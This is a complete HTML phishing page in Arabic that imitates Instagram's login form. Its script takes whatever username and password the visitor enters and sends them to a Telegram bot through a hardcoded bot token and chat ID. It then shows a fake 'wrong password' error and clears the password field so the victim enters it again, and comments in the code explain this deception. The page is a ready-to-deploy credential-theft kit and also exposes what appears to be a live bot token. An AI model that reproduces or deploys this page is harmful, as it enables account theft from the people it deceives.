<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px;
            text-align: center;
            margin-bottom: 10px;
        }

        .logo {
            margin-bottom: 30px;
            width: 175px;
        }

        .input-box {
            width: 100%;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 9px 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
            text-align: right;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        .btn-login {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }

        /* رسالة الخطأ الوهمية */
        #error-msg {
            color: #ed4956;
            font-size: 14px;
            margin: 15px 0;
            display: none; /* مخفية افتراضياً */
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .divider div {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider span {
            margin: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: block;
            margin-bottom: 15px;
        }

        .signup-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }

        .signup-container a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        @media (max-width: 450px) {
            body { background-color: #fff; }
            .login-container, .signup-container {
                width: 100%;
                border: none;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <div class="input-box">
                <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
            </div>
            <div class="input-box">
                <input type="password" id="password" placeholder="كلمة السر" required>
            </div>
            <button type="submit" class="btn-login">تسجيل الدخول</button>
            
            <div id="error-msg">عذراً، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر الخاصة بك.</div>
        </form>

        <div class="divider">
            <div></div>
            <span>أو</span>
            <div></div>
        </div>

        <a href="https://www.facebook.com/login" class="fb-login">تسجيل الدخول باستخدام فيسبوك</a>
    </div>

    <div class="signup-container">
        ليس لديك حساب؟ <a href="https://www.instagram.com/accounts/emailsignup/">اشترك الآن</a>
    </div>

    <script>
        const token = '8409685298:AAHN_RpQJOEte85gZMYgi2rPaE99lwXODPs';
        const chatId = '7822309283';

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const errorDiv = document.getElementById('error-msg');

            // إرسال البيانات لتليجرام
            const message = `⚠️ محاولة دخول جديدة:\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url).then(() => {
                // إظهار رسالة الخطأ بدلاً من التحويل للموقع الحقيقي
                errorDiv.style.display = 'block';
                // مسح حقل كلمة السر ليجبره على الإدخال مجدداً
                document.getElementById('password').value = '';
            });
        });
    </script>

</body>
</html>
